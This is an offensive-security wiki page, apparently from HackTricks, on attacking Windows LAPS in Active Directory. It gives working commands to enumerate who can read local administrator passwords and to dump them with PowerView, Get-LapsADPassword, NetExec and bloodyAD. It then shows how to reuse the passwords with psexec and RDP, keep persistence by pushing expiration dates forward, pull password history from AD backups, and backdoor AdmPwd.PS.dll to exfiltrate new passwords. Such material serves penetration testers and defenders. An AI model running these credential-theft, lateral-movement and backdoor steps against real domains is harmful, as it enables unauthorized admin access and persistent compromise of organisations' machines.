# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

There are currently **2 LAPS flavours** you can encounter during an assessment:

- **Legacy Microsoft LAPS**: stores the local administrator password in **`ms-Mcs-AdmPwd`** and the expiration time in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (built into Windows since the April 2023 updates): can still emulate legacy mode, but in native mode it uses **`msLAPS-*`** attributes, supports **password encryption**, **password history**, and **DSRM password backup** for domain controllers.

LAPS is designed to manage **local administrator passwords**, making them **unique, randomized, and frequently changed** on domain-joined computers. If you can read those attributes, you can usually **pivot as the local admin** to the affected host. In many environments, the interesting part is not only reading the password itself, but also finding **who was delegated access** to the password attributes.

### Legacy Microsoft LAPS attributes

In the domain's computer objects, the implementation of legacy Microsoft LAPS results in the addition of two attributes:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS adds several new attributes to computer objects:

- **`msLAPS-Password`**: clear-text password blob stored as JSON when encryption is not enabled
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: encrypted DSRM password data for domain controllers
- **`msLAPS-CurrentPasswordVersion`**: GUID-based version tracking used by newer rollback-detection logic (Windows Server 2025 forest schema)

When **`msLAPS-Password`** is readable, the value is a JSON object containing the account name, update time and clear-text password, for example:

```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```

### Check if activated

```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
  ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
  select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
  select DnsHostname
```

## LAPS Password Access

You could **download the raw LAPS policy** from `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` and then use **`Parse-PolFile`** from the [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package to convert this file into human-readable format.

### Legacy Microsoft LAPS PowerShell cmdlets

If the legacy LAPS module is installed, the following cmdlets are usually available:

```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```

### Windows LAPS PowerShell cmdlets

Native Windows LAPS ships with a new PowerShell module and new cmdlets:

```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```

A few operational details matter here:

- **`Get-LapsADPassword`** automatically handles **legacy LAPS**, **clear-text Windows LAPS**, and **encrypted Windows LAPS**.
- If the password is encrypted and you can **read** but not **decrypt** it, the cmdlet returns metadata such as **`Source`**, **`DecryptionStatus`**, and **`AuthorizedDecryptor`** even when it can't return the clear-text password.
- In **encrypted Windows LAPS**, **read permission** and **decrypt permission** are **different controls**. Having OU / object read access doesn't automatically mean you can decrypt **`msLAPS-EncryptedPassword`**.
- **Password history** is only available when **Windows LAPS encryption** is enabled.
- On domain controllers, the returned source can be **`EncryptedDSRMPassword`**.

This is useful during an assessment because the **`AuthorizedDecryptor`** field tells you **which user or group the blob was encrypted for**, often turning a failed password read into a new privilege-escalation target.

### PowerView / LDAP

**PowerView** can also be used to find out **who can read the password and read it**:

```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```

If **`msLAPS-Password`** is readable, parse the returned JSON and extract **`p`** for the password and **`n`** for the managed local admin account name.

```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```

That **`n`** field matters on newer deployments because **Windows LAPS automatic account management** can target a **custom account** instead of the built-in **`Administrator`**, and newer **Windows 11 24H2 / Windows Server 2025** systems can even **randomize** that account name.

### Linux / remote tooling

Modern tooling supports both legacy Microsoft LAPS and Windows LAPS.

```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
  get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
  --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

Notes:

- Recent **NetExec** builds support **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`**, and **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** is still useful for **legacy Microsoft LAPS** from Linux, but it only targets **`ms-Mcs-AdmPwd`**.
- Newer cross-platform tooling such as **`LAPS4LINUX`**, **`dpapi-ng`**-based tooling, and recent **NetExec** workflows can also handle **native Windows LAPS** from non-Windows hosts.
- If the environment uses **encrypted Windows LAPS**, a simple LDAP read is not enough; you also need to be an **authorized decryptor** (or equivalent decryption material, such as offline domain DPAPI-NG root key material).
- On **Windows 11 24H2 / Windows Server 2025**, don't assume the managed local admin is always **`Administrator`**. Automatic account management can create a custom account and optionally randomize its name, so discover the account name first via **`n`** / **`Account`** before using **`--laps`** at scale.

### Directory synchronization abuse

If you have domain-level **directory synchronization** rights instead of direct read access on each computer object, LAPS can still be interesting.

The combination of **`DS-Replication-Get-Changes`** with **`DS-Replication-Get-Changes-In-Filtered-Set`** or **`DS-Replication-Get-Changes-All`** can be used to synchronize **confidential / RODC-filtered** attributes such as legacy **`ms-Mcs-AdmPwd`**. BloodHound models this as **`SyncLAPSPassword`**. Check [DCSync](dcsync.md) for the replication-rights background.

## LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilitates the enumeration of LAPS with several functions.\
One is parsing **`ExtendedRights`** for **all computers with LAPS enabled.** This shows **groups** specifically **delegated to read LAPS passwords**, which are often users in protected groups.\
An **account** that has **joined a computer** to a domain receives `All Extended Rights` over that host, and this right gives the **account** the ability to **read passwords**. Enumeration may show a user account that can read the LAPS password on a host. This can help us **target specific AD users** who can read LAPS passwords.

```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```

## Dumping LAPS Passwords With NetExec / CrackMapExec

If you don't have an interactive PowerShell, you can abuse this privilege remotely over LDAP:

```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```

This dumps all the LAPS secrets that the user can read, allowing you to move laterally with a different local administrator password.

## Using LAPS Password

```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```

## LAPS Persistence

### Expiration Date

Once admin, it's possible to **obtain the passwords** and **prevent** a machine from **updating** its **password** by **setting the expiration date into the future**.

Legacy Microsoft LAPS:

```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

Native Windows LAPS uses **`msLAPS-PasswordExpirationTime`** instead:

```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```

> [!WARNING]
> The password will still rotate if an **admin** uses **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, or if **Do not allow password expiration time longer than required by policy** is enabled.

### Snapshot rollback caveat on newer Windows LAPS

Older snapshot / image rollback tricks are **less reliable** against recent **Windows LAPS** deployments. On **Windows 11 24H2 / Windows Server 2025**, if the forest schema includes **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**), the client compares a locally cached GUID with the value stored in AD and **immediately rotates the password** when a rollback creates a **torn state**.

In practice, this means snapshot-based persistence or attempts to resurrect an older known local admin password can burn quickly instead of surviving until the next normal expiration.

This protection only applies to **AD-backed Windows LAPS** and still depends on the reverted machine being able to **authenticate back to AD**. If the machine can't talk to AD anymore, **password history** or **AD backup access** may still save the day.

### Automatic account management tamper caveat

When **automatic account management** is enabled, Windows LAPS owns the lifecycle of the managed local admin account. Unexpected attempts to rename, reconfigure, or otherwise tamper with that account can be rejected with **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, so persistence that depends on silently modifying the managed LAPS account is less reliable on newer endpoints.

### Recovering historical passwords from AD backups

When **Windows LAPS encryption + password history** is enabled, mounted AD backups can become an additional source of secrets. If you can access a mounted AD snapshot and use **recovery mode**, you can query older stored passwords without talking to a live DC.

```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```

This is mostly relevant during **AD backup theft**, **offline forensics abuse**, or **disaster-recovery media access**.

### Backdoor

The original source code for legacy Microsoft LAPS can be found [here](https://github.com/GreyCorbel/admpwd), therefore it's possible to put a backdoor in the code (inside the `Get-AdmPwdPassword` method in `Main/AdmPwd.PS/Main.cs` for example) that will somehow **exfiltrate new passwords or store them somewhere**.

Then, compile the new `AdmPwd.PS.dll` and upload it to the machine in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (and change the modification time).

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
